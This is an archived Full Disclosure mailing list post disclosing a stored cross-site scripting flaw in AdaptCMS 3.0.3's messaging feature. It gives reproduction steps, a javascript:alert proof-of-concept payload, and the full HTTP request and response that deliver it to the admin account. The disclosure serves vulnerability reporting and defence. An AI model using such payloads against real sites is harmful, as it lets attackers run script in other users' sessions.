---
title: Stored XSS "Send Message" Functionality - adaptcmsv3.0.3
url: https://seclists.org/fulldisclosure/2025/Jun/6
source: Full Disclosure
date: 2025-06-04
fetch_date: 2025-10-06T22:56:28.808524
---

# Stored XSS "Send Message" Functionality - adaptcmsv3.0.3

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](5)
[By Date](date.html#6)
[![Next](/images/right-icon-16x16.png)](7)

[![Previous](/images/left-icon-16x16.png)](5)
[By Thread](index.html#6)
[![Next](/images/right-icon-16x16.png)](7)

![](/shared/images/nst-icons.svg#search)

# Stored XSS "Send Message" Functionality - adaptcmsv3.0.3

---

*From*: Andrey Stoykov <mwebsec () gmail com>
*Date*: Sun, 1 Jun 2025 16:06:32 +0100

---

```
# Exploit Title: Stored XSS "Send Message" Functionality - adaptcmsv3.0.3
# Date: 06/2025
# Exploit Author: Andrey Stoykov
# Version: 3.0.3
# Tested on: Debian 12
# Blog: https://msecureltd.blogspot.com/

Stored XSS "Send Message" Functionality #1:

Steps to Reproduce:

1. Login as normal user and visit "Profile" > "Message" > "Send Message"
2. In "Message" field enter the following payload "<form
action="javascript:alert(1)"><input id="x" type="submit" /></form><label
for="x">XSS</label>"
3. The payload would execute upon viewing the message

// HTTP POST request sending message

POST /adaptcms/messages/send HTTP/1.1
Host: 192.168.58.131
Content-Length: 591
Cache-Control: max-age=0
Accept-Language: en-GB,en;q=0.9
Origin: http://192.168.58.131
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
(KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
[...]

_method=POST&data[_Token][key]=aabf09c7e75b47229d84deadd98c6ab65e87f979&data[Message][recipient]=admin&data[Message][title]=test&data[Message][message]=<form
action="javascript:alert(1)"><input id="x" type="submit" /></form>
<p><label
for="x">XSS</label></p>&data[Message][parent_id]=0&data[Message][receiver_user_id]=1&data[_Token][fields]=a989058dd1dcaad53b324c3233dfc1e8f20ba411%3AMessage.parent_id%7CMessage.receiver_user_id&data[_Token][unlocked]=

// HTTP Response

HTTP/1.1 302 Found
Date: Fri, 30 May 2025 19:01:10 GMT
Server: Apache/2.4.37 (Unix) OpenSSL/1.0.2q PHP/5.6.40 mod_perl/2.0.8-dev
Perl/v5.16.3
X-Powered-By: PHP/5.6.40
Location: http://192.168.58.131/adaptcms/messages/index/outbox
Content-Length: 0
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](5)
[By Date](date.html#6)
[![Next](/images/right-icon-16x16.png)](7)

[![Previous](/images/left-icon-16x16.png)](5)
[By Thread](index.html#6)
[![Next](/images/right-icon-16x16.png)](7)

### Current thread:

* **Stored XSS "Send Message" Functionality - adaptcmsv3.0.3** *Andrey Stoykov (Jun 03)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")